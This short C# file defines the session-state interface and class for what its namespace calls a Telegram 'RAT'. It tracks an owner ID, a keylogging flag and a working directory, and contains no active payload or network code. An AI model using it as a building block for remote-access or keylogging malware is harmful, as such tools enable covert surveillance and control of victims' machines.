namespace TelegramRAT.Services;

public interface IBotSession
{
    long OwnerId { get; }
    bool IsKeylogging { get; set; }
    string CurrentDirectory { get; set; }
}

public class BotSession(long ownerId) : IBotSession
{
    public long OwnerId { get; } = ownerId;
    public bool IsKeylogging { get; set; }
    public string CurrentDirectory { get; set; } = Directory.GetCurrentDirectory();
}
